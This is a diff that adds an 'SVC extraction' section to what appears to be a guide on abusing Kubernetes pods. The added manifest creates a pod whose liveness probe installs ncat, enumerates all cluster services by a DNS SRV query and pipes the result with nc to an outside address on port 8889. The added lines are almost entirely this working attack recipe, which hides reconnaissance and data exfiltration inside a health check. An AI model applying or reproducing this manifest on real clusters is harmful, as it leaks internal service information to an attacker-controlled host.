@@ -68,7 +68,33 @@ spec:
       periodSeconds: 5
 EOF
 ```
-
+SVC extraction
+```
+kubectl apply -f - <<EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  labels:
+    test: liveness
+  name: liveness-exec15
+spec:
+  containers:
+  - name: liveness
+    image: xxradar/hackon
+    args:
+    - /bin/sh
+    - -c
+    - touch /tmp/healthy;sleep 600
+    livenessProbe:
+      exec:
+        command:
+        - bash
+        - -c
+        - apt-get install -y ncat dnsutils; dig +noall +answer srv any.any.svc.cluster.local | nc 192.168.0.131 8889 
+      initialDelaySeconds: 5
+      periodSeconds: 5
+EOF
+```
 ### Examples2: Installing applications the pod at deployment 
 ```
 kubectl apply -f - <<EOF
